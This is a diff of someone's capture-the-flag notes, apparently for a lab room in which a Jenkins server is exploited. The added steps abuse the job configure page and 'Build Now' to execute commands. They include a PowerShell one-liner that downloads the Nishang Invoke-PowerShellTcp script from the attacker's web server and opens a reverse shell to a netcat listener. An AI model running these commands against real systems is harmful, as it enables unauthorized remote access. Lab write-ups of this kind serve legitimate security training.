@@ -68,11 +68,16 @@ We get a hint of how to continue exploiting this room
 Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 
 You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
+### Finding the feature that allows for code execution
+1. Navigate to the following: http://10.10.206.196:8080/job/project/configure
+![[Pasted image 20251013215624.png]]
 
+2. Once we put the code in side the code block we go back to the page and press "Build Now"
+![[Pasted image 20251013215723.png]]
 ### Download the Nishang Script 
 1. Run the following
 ```shell
-wget ttps://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 2. Start our webserver on out attacker machine with the following
 ```bash
@@ -87,3 +92,13 @@ powershell iex (New-Object  Net.WebClient).DownloadString('http://your-ip:your-p
 ```
 
 replace http://your-ip:your-port/Invoke-PowerShellTcp.ps1 with the address obtained from your updog webserver
+```
+powershell iex (New-Object  Net.WebClient).DownloadString('http://10.9.0.78:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 10.9.0.78 -Port 4444
+```
+
+Copy the above command to the configure section as discussed above and when done, apply and save it, then press the build now button and now we should have a netcat shell activated back on our attacker machine
+
+![[Pasted image 20251013220253.png]]
+
+lets find the user.txt file now
+
